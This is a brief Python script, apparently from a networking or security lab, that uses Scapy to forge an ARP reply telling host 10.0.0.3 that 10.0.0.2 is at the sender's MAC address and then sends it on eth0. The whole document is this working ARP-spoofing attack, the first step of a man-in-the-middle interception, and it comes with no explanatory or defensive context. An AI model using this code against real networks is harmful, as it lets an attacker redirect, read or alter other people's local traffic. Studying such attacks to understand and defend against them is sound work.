from scapy.all import *
eth = Ether(dst="ff:ff:ff:ff:ff:ff", src="fa:a4:26:a0:78:92")
arp = ARP(op=2, psrc="10.0.0.2", hwsrc="fa:a4:26:a0:78:92", pdst="10.0.0.3", hwdst="ff:ff:ff:ff:ff:ff")
arp_pkt = eth/arp
response = srp(arp_pkt, iface="eth0")
print(response)
